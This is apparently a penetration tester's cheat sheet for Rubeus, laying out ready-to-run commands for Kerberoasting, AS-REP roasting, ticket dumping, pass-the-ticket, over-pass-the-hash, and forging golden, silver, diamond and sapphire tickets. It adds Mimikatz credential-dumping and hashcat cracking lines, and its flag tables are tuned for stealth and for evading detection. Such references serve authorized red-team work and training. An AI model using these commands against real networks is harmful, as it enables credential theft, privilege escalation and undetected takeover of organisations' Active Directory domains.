# Rubeus - Full Reference

Rubeus is a C# tool for Kerberos abuse. Lives entirely in memory, no files dropped.
More opsec-friendly than Mimikatz for ticket operations.

**Run from:**
```sh
.\Rubeus.exe <command> <flags>
# Or load into memory via PowerShell to avoid disk writes
```

---

## Kerberoasting

Request TGS hashes for accounts with SPNs, crack offline.

```sh
# Dump all Kerberoastable hashes
.\Rubeus.exe kerberoast /outfile:tgs.txt

# Target a specific user
.\Rubeus.exe kerberoast /user:sqlservice /outfile:tgs.txt

# Request RC4 (easier to crack) even if AES is supported
.\Rubeus.exe kerberoast /rc4opsec /outfile:tgs.txt
```

Crack output:
```sh
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

---

## AS-REP Roasting

Targets accounts with "Do not require Kerberos preauthentication" enabled.

```sh
# Find and dump AS-REP hashes
.\Rubeus.exe asreproast /outfile:asrep.txt

# Target specific user
.\Rubeus.exe asreproast /user:jdoe /outfile:asrep.txt

# From Linux (Impacket)
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat
```

Crack:
```sh
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Pass the Ticket (PTT)

Inject a ticket into your current session without needing the password.

```sh
# Inject a .kirbi ticket file
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Inject base64 encoded ticket
.\Rubeus.exe ptt /ticket:<base64>

# Verify it loaded
.\Rubeus.exe klist
```

**Where tickets come from:**
- `sekurlsa::tickets /export` in Mimikatz -> `.kirbi` files
- `.\Rubeus.exe dump` -> base64 tickets
- Your own generated Golden/Silver tickets

---

## Dump Tickets from Memory

```sh
# List all tickets in current session
.\Rubeus.exe klist

# Dump all tickets (base64 + info)
.\Rubeus.exe dump

# Dump tickets for a specific service
.\Rubeus.exe dump /service:krbtgt

# Dump tickets for specific LUID (login session)
.\Rubeus.exe dump /luid:0x3e4
```

---

## Golden Ticket (Rubeus)

**What you need:** krbtgt hash, domain SID, domain FQDN

```sh
.\Rubeus.exe golden /rc4:<KRBTGT-NTLM-HASH> /domain:corp.local /sid:S-1-5-21-111-222-333 /user:FakeAdmin /ptt
```

**Or with AES (stealthier - preferred):**
```sh
.\Rubeus.exe golden /aes256:<KRBTGT-AES256-KEY> /domain:corp.local /sid:S-1-5-21-111-222-333 /user:FakeAdmin /ptt
```

**Every flag:**

| Flag | What it takes | Where to get it |
|---|---|---|
| `/rc4:` | krbtgt NTLM hash | `lsadump::dcsync /user:krbtgt` -> `Hash NTLM:` |
| `/aes256:` | krbtgt AES256 key | `lsadump::dcsync /user:krbtgt` -> `AES256 HMAC:` |
| `/domain:` | Domain FQDN | `corp.local` |
| `/sid:` | Domain SID (no user RID) | `whoami /user` -> remove last segment. Or DCSync output |
| `/user:` | Any username - real or fake | Doesn't matter - `FakeAdmin`, `backdoor`, `Administrator` |
| `/id:` | RID (optional) | Default `500` (Administrator). Leave default unless you need specific RID |
| `/groups:` | Group RIDs (optional) | Default includes `512` (Domain Admins). Add `519` for Enterprise Admins |
| `/ptt` | Inject directly into session | No value. Alternative: `/outfile:golden.kirbi` saves to file |
| `/startoffset:` | Minutes in past (optional) | Default `-10`. Mimics real tickets to avoid detection |
| `/endin:` | Lifetime in minutes (optional) | Default `600` (10 hrs) - same as real tickets |

---

## Silver Ticket (Rubeus)

Forge a TGS for one specific service. Stealthier than Golden - never contacts the DC.

**What you need:** Service account hash, domain SID, target server FQDN, service type

```sh
.\Rubeus.exe silver /rc4:<SERVICE-ACCOUNT-HASH> /domain:corp.local /sid:S-1-5-21-111-222-333 /target:dc01.corp.local /service:cifs /user:FakeAdmin /ptt
```

| Flag | What it takes | Notes |
|---|---|---|
| `/rc4:` | Service account NTLM hash | NOT krbtgt - the account running the service |
| `/target:` | Server FQDN | `dc01.corp.local`, `webserver.corp.local` |
| `/service:` | Service type | `cifs`, `http`, `ldap`, `mssql`, `host`, `rpcss` |

**Finding the service account hash:**
```sh
# If you know which account runs the service:
lsadump::dcsync /user:<serviceaccount>

# Or from secretsdump output - look for service accounts
```

---

## Diamond Ticket

**What it is:** Requests a real TGT from the DC, then patches it to add DA group membership. The DC signed it - so it passes PAC validation that catches Golden Tickets.

**Harder to detect than Golden Ticket** because:
- Real TGT -> real DC signature
- Only the PAC (privilege data) is modified

**What you need:** Valid domain user credentials OR a hash, plus krbtgt hash

```sh
# With password
.\Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /ticketuserpass:Password1 /enctype:aes /krbkey:<KRBTGT-AES256> /domain:corp.local /dc:<DC-IP> /ptt

# With hash (no plaintext needed)
.\Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /rc4:<USER-HASH> /enctype:aes /krbkey:<KRBTGT-AES256> /domain:corp.local /dc:<DC-IP> /ptt
```

| Flag | What it takes | Where to get it |
|---|---|---|
| `/tgtdeleg` | Use ticket delegation trick | No value - just include it |
| `/ticketuser:` | Real existing domain user | Any valid user you have access as |
| `/ticketuserpass:` | That user's password | Their plaintext password |
| `/rc4:` | That user's NTLM hash | Alternative to `/ticketuserpass:` |
| `/enctype:` | Encryption type | Use `aes` - stealthier than rc4 |
| `/krbkey:` | krbtgt AES256 key | `lsadump::dcsync /user:krbtgt` -> `AES256 HMAC:` |
| `/domain:` | Domain FQDN | `corp.local` |
| `/dc:` | DC IP or hostname | `10.10.0.5` or `dc01.corp.local` |
| `/ptt` | Inject into session | No value |

---

## Sapphire Ticket

Similar to Diamond but copies privileges from a real DA's PAC - most realistic, hardest to detect.

```sh
.\Rubeus.exe sapphire /target:<DA-USERNAME> /enctype:aes /krbkey:<KRBTGT-AES256> /domain:corp.local /dc:<DC-IP> /ptt
```

---

## Over-Pass-the-Hash (Pass-the-Key)

Use a hash/key to get a Kerberos TGT - avoids NTLM traffic entirely (stealthier on networks monitoring for NTLM).

```sh
# With NTLM hash -> get TGT
.\Rubeus.exe asktgt /user:Administrator /rc4:<NTLM-HASH> /domain:corp.local /dc:<DC-IP> /ptt

# With AES key -> stealthier
.\Rubeus.exe asktgt /user:Administrator /aes256:<AES256-KEY> /domain:corp.local /dc:<DC-IP> /ptt

# Where AES keys come from:
sekurlsa::ekeys    # In Mimikatz - dumps AES keys from LSASS
```

---

## Ticket Type Summary

| Ticket | Forge using | Needs | Detectable by |
|---|---|---|---|
| **Golden** | krbtgt hash | DCSync / NTDS dump | PAC validation (if enabled), unusual ticket lifetimes |
| **Silver** | Service account hash | Any DA access to get hash | Only service logs - very stealthy |
| **Diamond** | krbtgt AES + valid user | DCSync | Harder - real DC signature |
| **Sapphire** | krbtgt AES + real DA exists | DCSync | Hardest - copies real DA PAC |

---

## Quick Reference: Where Values Come From

| Value | Command to get it |
|---|---|
| krbtgt NTLM hash | `lsadump::dcsync /user:krbtgt` -> `Hash NTLM:` |
| krbtgt AES256 key | `lsadump::dcsync /user:krbtgt` -> `AES256 HMAC:` |
| Domain SID | `whoami /user` -> remove last `-XXX`. Or from DCSync SID field |
| Domain FQDN | `ipconfig /all` (DNS suffix), `Get-Domain`, any previous enum |
| Service account hash | `lsadump::dcsync /user:<svcaccount>` or `sekurlsa::logonPasswords` |
| User NTLM hash | `sekurlsa::logonPasswords` or `lsadump::sam` |
| User AES key | `sekurlsa::ekeys` |
